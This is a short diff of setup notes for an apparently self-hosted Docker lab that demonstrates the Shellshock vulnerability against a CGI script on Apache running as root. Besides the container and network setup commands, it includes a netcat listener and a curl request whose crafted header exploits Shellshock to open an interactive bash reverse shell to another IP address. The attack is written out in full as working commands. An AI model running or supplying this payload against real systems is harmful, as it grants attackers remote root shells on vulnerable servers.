@@ -19,9 +19,11 @@ sudo docker run -it -v $(pwd):/app ubuntu:18.04 /bin/bash
 
 
 3. set shellshock with apache running as root
-sudo docker build -t pwn . 
-sudo docker run pwn
-curl 172.17.0.2/cgi-bin/index.bash
+sudo docker network create --subnet=172.18.0.0/16 pocnet
+sudo docker login
+sudo docker run --network pocnet --ip 172.18.0.22 sandrolex2/poc
+sudo docker run --network pocnet --ip 172.18.0.23 -p 80:80 rproxy
+curl host/cgi-bin/index.bash
 
 nc -lnvp 8888
 curl 172.17.0.2/cgi-bin/index.bash -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/bash -i >& /dev/tcp/172.31.87.117/8888 0>&1 "
